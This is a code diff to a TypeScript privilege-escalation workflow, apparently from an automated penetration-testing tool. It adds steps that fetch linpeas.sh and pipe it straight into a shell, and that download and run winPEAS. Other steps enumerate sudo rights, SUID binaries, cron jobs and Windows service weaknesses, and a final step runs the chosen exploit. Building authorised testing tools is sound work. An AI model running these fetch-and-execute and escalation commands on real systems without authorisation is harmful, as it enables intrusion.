@@ -58,13 +58,15 @@ export const PRIVESC_BLOCK: BlockDef = {
     { key: "privesc.os_switch", title: "OS Switch", type: "mechanical", nodeType: "selector", dependsOn: ["privesc.detect_os"], priority: 8 },
 
     // --- Linux branch ---
+    { key: "privesc.linux_auto", title: "Linux: linpeas.sh", type: "mechanical", command: "pk exec -- curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null || echo 'linpeas unavailable, using manual checks'", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 9, description: "Automated privesc enumeration. Catches capabilities, docker group, interesting files, and dozens of vectors." },
     { key: "privesc.linux_sudo", title: "Linux: sudo -l", type: "mechanical", command: "pk exec -- sudo -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 10 },
     { key: "privesc.linux_suid", title: "Linux: SUID binaries", type: "mechanical", command: "pk exec -- find / -perm -4000 -type f 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 10 },
     { key: "privesc.linux_cron", title: "Linux: Cron jobs", type: "mechanical", command: "pk exec -- cat /etc/crontab 2>/dev/null && ls -la /etc/cron.* 2>/dev/null && crontab -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 15 },
     { key: "privesc.linux_writable", title: "Linux: Writable paths", type: "mechanical", command: "pk exec -- find / -writable -type f 2>/dev/null | grep -v proc | head -20", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 20 },
-    { key: "privesc.linux_kernel", title: "Linux: Kernel version check", type: "judgment", description: "Check kernel version against known exploits. Prefer GTFOBins for SUID/sudo over kernel exploits.", dependsOn: ["privesc.linux_sudo", "privesc.linux_suid"], priority: 25 },
+    { key: "privesc.linux_kernel", title: "Linux: Kernel version check", type: "judgment", description: "Check kernel version against known exploits. Prefer GTFOBins for SUID/sudo over kernel exploits.", dependsOn: ["privesc.linux_auto", "privesc.linux_sudo", "privesc.linux_suid"], priority: 25 },
 
     // --- Windows branch ---
+    { key: "privesc.win_auto", title: "Windows: winPEAS", type: "mechanical", command: "pk exec -- curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o /tmp/winpeas.exe && /tmp/winpeas.exe 2>/dev/null || echo 'winpeas unavailable'", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 9 },
     { key: "privesc.win_whoami", title: "Windows: whoami /priv", type: "mechanical", command: "pk exec -- whoami /priv", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 10 },
     { key: "privesc.win_services", title: "Windows: Weak service perms", type: "mechanical", command: "pk exec -- sc query state= all | findstr SERVICE_NAME", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 15 },
     { key: "privesc.win_unquoted", title: "Windows: Unquoted service paths", type: "mechanical", command: "pk exec -- wmic service get name,pathname | findstr /v /c:\"C:\\Windows\"", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 15 },
@@ -77,7 +79,7 @@ export const PRIVESC_BLOCK: BlockDef = {
     { key: "privesc.mac_launchd", title: "macOS: LaunchDaemons/Agents", type: "mechanical", command: "pk exec -- ls -la /Library/LaunchDaemons/ /Library/LaunchAgents/ ~/Library/LaunchAgents/ 2>/dev/null", dependsOn: ["privesc.os_switch"], priority: 15 },
 
     // Converge: pick the best vector from whichever OS branch ran
-    { key: "privesc.choose", title: "Choose privesc vector", type: "judgment", description: "Evaluate all findings from the OS-specific checks. Pick the most reliable, least destructive escalation path.", dependsOn: ["privesc.linux_kernel", "privesc.linux_cron", "privesc.linux_writable", "privesc.win_potato", "privesc.win_services", "privesc.win_unquoted", "privesc.win_autologon", "privesc.mac_sudo", "privesc.mac_tcc", "privesc.mac_launchd"], priority: 30 },
+    { key: "privesc.choose", title: "Choose privesc vector", type: "judgment", description: "Evaluate all findings from automated + manual checks. Pick the most reliable, least destructive escalation path. Use GTFOBins for SUID/sudo.", dependsOn: ["privesc.linux_kernel", "privesc.linux_cron", "privesc.linux_writable", "privesc.win_auto", "privesc.win_potato", "privesc.win_services", "privesc.win_unquoted", "privesc.win_autologon", "privesc.mac_sudo", "privesc.mac_tcc", "privesc.mac_launchd"], priority: 30 },
     { key: "privesc.escalate", title: "Execute escalation", type: "judgment", description: "Run the chosen privesc exploit. Capture evidence of elevated access.", dependsOn: ["privesc.choose"], priority: 35 },
   ],
 };
